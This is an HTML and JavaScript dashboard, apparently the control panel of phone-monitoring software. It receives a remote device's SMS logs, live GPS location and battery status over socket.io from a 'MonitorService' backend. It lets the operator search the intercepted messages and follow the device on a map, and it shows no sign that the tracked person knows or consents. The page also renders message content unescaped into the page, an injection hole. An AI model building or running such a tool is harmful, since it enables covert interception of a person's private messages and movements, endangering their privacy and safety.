<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Management Console</title>
    <script src="/socket.io/socket.io.js"></script>
    
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    
    <style>
        :root { 
            --bg-color: #f4f7f6; 
            --sidebar-color: #2c3e50; 
            --accent-color: #1abc9c; 
            --text-main: #333333;
            --text-muted: #7f8c8d;
            --white: #ffffff;
        }

        body { 
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            margin: 0; 
            display: flex; 
            background: var(--bg-color); 
            color: var(--text-main); 
        }
        
        /* SIDEBAR */
        .sidebar { width: 250px; background: var(--sidebar-color); color: var(--white); height: 100vh; position: fixed; box-shadow: 2px 0 5px rgba(0,0,0,0.1); }
        .sidebar-brand { padding: 25px 20px; font-size: 1.2rem; font-weight: bold; border-bottom: 1px solid #34495e; color: var(--accent-color); }
        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #34495e; transition: 0.3s; color: #bdc3c7; }
        .nav-item:hover, .nav-item.active { background: var(--accent-color); color: var(--white); }

        /* FIXED HEADER */
        .fixed-header {
            position: fixed; top: 0; left: 250px; right: 0; height: 90px;
            background: var(--white); border-bottom: 1px solid #ddd;
            display: flex; justify-content: space-between; align-items: center;
            padding: 0 30px; z-index: 1000;
        }
        .gps-display { font-size: 0.9rem; color: var(--text-muted); line-height: 1.4; }
        .gps-address { font-weight: bold; color: var(--sidebar-color); display: block; margin-bottom: 2px; font-size: 1rem; }

        .status-container { display: flex; align-items: center; gap: 20px; }
        .status-indicator { display: flex; align-items: center; gap: 8px; font-weight: bold; }
        #status-dot { font-size: 2.5rem; line-height: 0; margin-top: -5px; color: #e74c3c; transition: color 0.5s; }

        /* MAIN CONTENT AREA */
        .main-content { margin-left: 250px; padding-top: 110px; flex: 1; height: 100vh; box-sizing: border-box; }
        .view { display: none; padding: 0 30px 30px 30px; }
        .view.active { display: block; }

        /* SEARCH BOX */
        .search-bar {
            width: 100%; padding: 12px 15px; margin-bottom: 20px; 
            border: 1px solid #ced4da; border-radius: 6px; 
            font-size: 1rem; box-sizing: border-box; outline: none;
            background: var(--white); color: var(--text-main);
        }
        .search-bar:focus { border-color: var(--accent-color); box-shadow: 0 0 0 2px rgba(26, 188, 156, 0.2); }

        /* TABLE STYLING */
        .table-container { background: var(--white); border-radius: 8px; overflow: hidden; box-shadow: 0 2px 12px rgba(0,0,0,0.05); }
        table { width: 100%; border-collapse: collapse; }
        th { background: #f8f9fa; padding: 15px; text-align: left; border-bottom: 2px solid #edf2f7; font-size: 0.85rem; color: var(--text-muted); text-transform: uppercase; }
        td { padding: 15px; border-bottom: 1px solid #edf2f7; font-size: 0.95rem; color: #2d3748 !important; vertical-align: top; }
        
        .Incoming { color: #27ae60 !important; font-weight: bold; }
        .Outgoing { color: #2980b9 !important; font-weight: bold; }

        /* MAP AREA */
        #map { width: 100%; height: calc(100vh - 200px); border-radius: 10px; border: 1px solid #ddd; background: #eee; }

        /* BATTERY ICON */
        .battery-stack { position: relative; font-size: 2rem; }
        #bolt { position: absolute; left: 5px; color: #f1c40f; display: none; text-shadow: 1px 1px 2px rgba(0,0,0,0.5); }
    </style>
</head>
<body>

<div class="sidebar">
    <div class="sidebar-brand">SYSTEM_MONITOR</div>
    <div class="nav-item active" onclick="showView('dash')">üìä Dashboard</div>
    <div class="nav-item" onclick="showView('sms')">‚úâÔ∏è Communication Logs</div>
    <div class="nav-item" onclick="showView('map-view')">üìç Live Map Tracking</div>
</div>

<div class="fixed-header">
    <div class="gps-display">
        <span id="gps-addr" class="gps-address">Initializing GPS satellite link...</span>
        Accuracy: <span id="gps-acc">0.00</span>m | Last Fix: <span id="gps-time">--/--/-- --:--:--</span>
    </div>
    
    <div class="status-container">
        <div class="status-indicator">
            <span id="status-dot">‚óè</span> 
            <span id="status-text" style="font-size: 0.8rem;">OFFLINE</span>
        </div>
        <div style="font-size: 1.8rem; font-weight: 300;"><span id="pct">--</span>%</div>
        <div class="battery-stack">
            <span>üîã</span>
            <span id="bolt">‚ö°</span>
        </div>
    </div>
</div>

<div class="main-content">
    <div id="dash" class="view active">
        <h2>System Overview</h2>
        <div class="table-container" style="padding: 20px;">
            <p>Background monitoring services are active. Ensure the device has <b>"Allow all the time"</b> location permissions enabled for accurate tracking.</p>
        </div>
    </div>

    <div id="sms" class="view">
        <h2>Message History</h2>
        <input type="text" id="smsSearch" class="search-bar" placeholder="Search by phone number or message content..." onkeyup="filterSMS()">
        <div class="table-container">
            <table>
                <thead>
                    <tr>
                        <th style="width: 100px;">Type</th>
                        <th style="width: 180px;">Number</th>
                        <th>Message</th>
                        <th style="width: 180px;">Date/Time</th>
                    </tr>
                </thead>
                <tbody id="sms-table">
                    <tr><td colspan="4" style="text-align:center; padding:40px; color:#999;">Requesting data from device...</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <div id="map-view" class="view">
        <div id="map"></div>
    </div>
</div>

<script>
    const socket = io();
    let map, marker, allSMS = [];

    // Navigation Logic
    function showView(id) {
        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        
        document.getElementById(id).classList.add('active');
        event.currentTarget.classList.add('active');

        if(id === 'map-view') {
            setTimeout(() => { 
                if(!map) initMap();
                map.invalidateSize(); 
            }, 300);
        }
        if(id === 'sms') socket.emit('get-sms-request');
    }

    // Initialize OpenStreetMap
    function initMap() {
        map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 19,
            attribution: '¬© OpenStreetMap'
        }).addTo(map);
        marker = L.marker([0, 0]).addTo(map);
    }

    // --- SOCKET EVENT LISTENERS (Synchronized with MonitorService.java) ---

    // GPS Updates
    socket.on('gps-update', (data) => {
        document.getElementById('gps-addr').innerText = data.address;
        document.getElementById('gps-acc').innerText = data.accuracy;
        document.getElementById('gps-time').innerText = data.time;
        
        if(data.lat && data.lng) {
            const pos = [data.lat, data.lng];
            if(!map) initMap();
            map.setView(pos, 16);
            marker.setLatLng(pos);
            updateStatus(true);
        }
    });

    // Battery Updates
    socket.on('battery-status', (data) => {
        document.getElementById('pct').innerText = data.percent;
        document.getElementById('bolt').style.display = data.charging ? "block" : "none";
        updateStatus(true);
    });

    // SMS Log Updates
    socket.on('sms-data-log', (data) => {
        allSMS = data;
        renderSMS(allSMS);
        updateStatus(true);
    });

    function updateStatus(isOnline) {
        const dot = document.getElementById('status-dot');
        const text = document.getElementById('status-text');
        dot.style.color = isOnline ? "#2ecc71" : "#e74c3c";
        text.innerText = isOnline ? "ONLINE" : "OFFLINE";
        text.style.color = isOnline ? "#2ecc71" : "#e74c3c";
    }

    // --- TABLE RENDERING & FILTERING ---

    function renderSMS(data) {
        const tableBody = document.getElementById('sms-table');
        if(data.length === 0) {
            tableBody.innerHTML = '<tr><td colspan="4" style="text-align:center;">No messages found.</td></tr>';
            return;
        }

        tableBody.innerHTML = data.map(m => `
            <tr>
                <td class="${m.type}">${m.type.toUpperCase()}</td>
                <td style="font-weight: 600;">${m.address}</td>
                <td>${m.body}</td>
                <td style="color:#7f8c8d; font-size:0.85rem;">${new Date(m.date).toLocaleString()}</td>
            </tr>
        `).join('');
    }

    function filterSMS() {
        const query = document.getElementById('smsSearch').value.toLowerCase();
        const filtered = allSMS.filter(m => 
            m.address.toLowerCase().includes(query) || 
            m.body.toLowerCase().includes(query)
        );
        renderSMS(filtered);
    }

    // Connection Watchdog
    socket.on('disconnect', () => updateStatus(false));
</script>

</body>
</html>
